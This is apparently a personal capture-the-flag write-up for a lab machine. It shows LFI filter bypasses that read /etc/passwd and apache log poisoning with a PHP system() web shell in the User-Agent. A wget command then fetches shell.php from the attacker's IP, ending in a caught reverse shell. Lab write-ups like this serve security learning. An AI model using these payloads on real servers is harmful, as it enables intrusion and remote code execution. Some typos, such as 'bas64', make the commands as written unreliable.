1. started of with nmap scan as usaul and found port
    1. 80-http open
    2. 22-ssh open

---

1. skipped over ssh since bruteforce isnt the way and started enuming http
    1. website didnt have much and neither did the sub dirs
    2. but i did find a email “john@mafialive.thm” which looks like a domain name
    3. so i put that into my hosts file and went to it, and it was a domain name

---

1. so i started enumeratiob on it
    1. found test.php
    2. /robots.txt
        1. inside this was just/text.php

---

1. on the test.php page it had a button when clicked loaded mrrobot.php and when i looked at the url i saw it was ?view=/var/www/html/development_testing, this means its vulnerable to LFI

---

1. i tried basic inputs like ../../etc/passwd but nothing was working so did some googling and found i could use

```python
view=php://filter/convert.bas64-encode/resource=/
```

basically what this does is it takes in an input and encodes it to base64, and this can bypass filters stopping me from viewing stuff, so i used that command to show me text.php source code

```python
view=php://filter/convert.bas64-encode/resource=/var/www/html/development_testing/test.php
```

this gave me the base64 encoded test of the page which allowed me to check the rules that are in place

1. URL must not include ../..
2. URL must include /var/www/development_testing

and to bypass the ../.. rule i could use ..//.. since linux sees it the same as ../..

so now i could craft a payload, i tested this by using

```python
view=/var/www/html/development_testing//..//..//..//..//etc/passwd
```

and it worked i was able to see /etc/passwd

---

1. Now i had to get a reverse shell somehow and my hint was poisining, so after some googling i found out i could poisen the /var/log/apache2/access.log file, the steps to do this are
    1. capture the request using burp suite (the request must be to the base /test.php) not anything else
    2. change the User-Agent header by putting in a PHP payload
        
        ```python
        <?php system($_GET['cmd']); ?>
        ```
        
        now whenever i request the log file i can execute this function for whatever command i wanted since it takes in the command from cmd= and uses system to execute it on the host 
        
    
    ---
    
    1. Now i use LFI to access the log file
        
        ```python
        view=/var/www/html/development_testing//..//..//..//log/apache2/access.log
        ```
        
        and then i add my cmd command
        
        ```python
        view=/var/www/html/development_testing//..//..//..//log/apache2/access.log&cmd=uname
        ```
        
        and it worked it output the host details, now that i know its been poisend i can use wget to upload a reverse shell to the machine 
        
    
    ---
    
    1. so first i have to start a python3 web server in the file the script is in, then using the LFI with the php script injection i can use wget to download it
    
    ```python
    view=/var/www/html/development_testing//..//..//..//log/apache2/access.log&cmd=wget%20http://10.4.49.64/shell.php
    ```
    
    now that the script is downloaded onto the machine i simply make the server run it by calling it
    
    ```python
    http://mafialive.thm/shell.php
    ```
    
    and in my listener i have caught it

    1. now onto priv escalation,
